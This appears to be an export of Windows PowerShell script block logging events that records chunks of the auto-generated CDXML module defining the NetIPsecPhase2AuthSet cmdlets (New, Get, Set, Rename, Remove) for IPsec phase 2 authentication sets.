                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecPhase2AuthSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-NetIPsecPhase2AuthSet' -Alias '*'
        

function Rename-NetIPsecPhase2AuthSet
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP2AuthSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIKEP2AuthSet')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName', Mandatory=$true)]
    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [Parameter(ParameterSetName='ByQuery', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true)]
    [Parameter(ParameterSetName='GetAll', Mandatory=$true)]
    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true)]
    [string]
    ${NewName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecRule') -and (@('ByAssociatedNetIPsecRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecRule}, 'MSFT_NetConSecRuleEMAuthSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic

ScriptBlock ID: eae1be9a-bbc7-4657-8997-5e4c7169c46a
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (2 of 4):
Group', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecRule') -and (@('ByAssociatedNetIPsecRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecRule}, 'MSFT_NetConSecRuleEMAuthSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecPhase2AuthSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetIPsecPhase2AuthSet' -Alias '*'
        

function Set-NetIPsecPhase2AuthSet
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP2AuthSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByDisplayGroup', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByGroup', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIKEP2AuthSet')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewDisplayName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Description},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [ciminstance[]]
    ${Proposal},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByDisplayGroup') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByGroup') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewDisplayName')) {
            [object]$__cmdletization_value = ${NewDisplayName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Description')) {
            [object]$__cmdletization_value = ${Description}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Proposal')) {
            [object]$__cmdletization_value = ${Proposal}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Proposals'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Proposals'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecPhase2AuthSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetIPsecPhase2AuthSet' -Alias '*'
        

function Remove-NetIPsecPhase2AuthSet
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP2AuthSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIKEP2AuthSet')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByA

ScriptBlock ID: eae1be9a-bbc7-4657-8997-5e4c7169c46a
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 4):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetIKEP2AuthSet'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function New-NetIPsecPhase2AuthSet
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('ID')]
    [string]
    ${Name},

    [Parameter(ParameterSetName='cim:CreateInstance0', Mandatory=$true)]
    [string]
    ${DisplayName},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Description},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Group},

